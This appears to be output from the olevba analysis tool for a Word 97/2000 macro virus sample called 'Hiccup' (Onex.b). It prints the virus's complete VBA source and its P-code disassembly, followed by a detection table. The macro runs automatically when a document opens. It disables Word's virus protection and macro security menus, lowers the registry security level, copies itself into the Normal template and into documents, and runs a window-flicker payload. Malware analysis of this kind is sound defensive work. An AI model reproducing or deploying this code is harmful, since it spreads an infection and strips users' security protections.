olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Onex.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO hiccup.cls 
in file: Virus.MSWord.Onex.b - OLE stream: 'Macros/VBA/hiccup'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
 On Error Resume Next
 Set Code = New DataObject
 Options.ConfirmConversions = 0
 Options.SaveNormalPrompt = 0
 Options.VirusProtection = 0
  If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
     CommandBars("Macro").Controls("Security...").Enabled = 0
     System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
  End If
 CommandBars("Tools").Controls("Macro").Enabled = 0
  If NormalTemplate.VBProject.VBComponents(1).Name = "hiccup" Then
    callitn = True
   Else
    Set A = NormalTemplate.VBProject.VBComponents(1)
  End If
  If ActiveDocument.VBProject.VBComponents(1).Name = "hiccup" Then
    callita = True
   Else
    Set A = ActiveDocument.VBProject.VBComponents(1)
    saveit = True
  End If
  Set ab = A.CodeModule
   Code.SetText hiccup.VBProject.VBComponents(1).CodeModule.Lines(1, hiccup.VBProject.VBComponents(1).CodeModule.CountOfLines)
   ab.DeleteLines 1, ab.CountOfLines
   ab.InsertLines 1, Code.GetText
   A.Name = "hiccup"
   If callitn = True And callita = True Then
    If Int(Rnd * 8) = 2 Then
      Call hiccup_payload
    End If
   End If
  If saveit = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
Private Sub hiccup_payload()
On Error Resume Next
Do
DoEvents
Randomize
If Int(Rnd * 10000) = 2 Then
 Word.ActiveDocument.ActiveWindow.WindowState = wdWindowStateMinimize
 Word.ActiveDocument.ActiveWindow.WindowState = wdWindowStateMaximize
End If
Loop
End Sub
' Word 97/2k - Hiccup - Psyclone X
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Onex.b
' ===============================================================================
' Module streams:
' Macros/VBA/hiccup - 4778 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	SetStmt 
' 	New <crash>
' 	Set Code 
' Line #3:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #4:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #6:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #7:
' 	LitDI2 0x0000 
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #8:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #9:
' 	EndIfBlock 
' Line #10:
' 	LitDI2 0x0000 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #11:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "hiccup"
' 	Eq 
' 	IfBlock 
' Line #12:
' 	LitVarSpecial (True)
' 	St callitn 
' Line #13:
' 	ElseBlock 
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set A 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "hiccup"
' 	Eq 
' 	IfBlock 
' Line #17:
' 	LitVarSpecial (True)
' 	St callita 
' Line #18:
' 	ElseBlock 
' Line #19:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set A 
' Line #20:
' 	LitVarSpecial (True)
' 	St saveit 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	SetStmt 
' 	Ld A 
' 	MemLd CodeModule 
' 	Set ab 
' Line #23:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld hiccup 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld hiccup 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld Code 
' 	ArgsMemCall SetText 0x0001 
' Line #24:
' 	LitDI2 0x0001 
' 	Ld ab 
' 	MemLd CountOfLines 
' 	Ld ab 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #25:
' 	LitDI2 0x0001 
' 	Ld Code 
' 	MemLd GetText 
' 	Ld ab 
' 	ArgsMemCall InsertLines 0x0002 
' Line #26:
' 	LitStr 0x0006 "hiccup"
' 	Ld A 
' 	MemSt New 
' Line #27:
' 	Ld callitn 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld callita 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #28:
' 	Ld Rnd 
' 	LitDI2 0x0008 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #29:
' 	ArgsCall (Call) hiccup_payload 0x0000 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	Ld saveit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #33:
' 	EndSub 
' Line #34:
' 	FuncDefn (Private Sub hiccup_payload())
' Line #35:
' 	OnError (Resume Next) 
' Line #36:
' 	Do 
' Line #37:
' 	ArgsCall DoEvents 0x0000 
' Line #38:
' 	ArgsCall Read 0x0000 
' Line #39:
' 	Ld Rnd 
' 	LitDI2 0x2710 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #40:
' 	Ld wdWindowStateMinimize 
' 	Ld Word 
' 	MemLd ActiveDocument 
' 	MemLd ActiveWindow 
' 	MemSt WindowState 
' Line #41:
' 	Ld wdWindowStateMaximize 
' 	Ld Word 
' 	MemLd ActiveDocument 
' 	MemLd ActiveWindow 
' 	MemSt WindowState 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	Loop 
' Line #44:
' 	EndSub 
' Line #45:
' 	QuoteRem 0x0000 0x0021 " Word 97/2k - Hiccup - Psyclone X"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

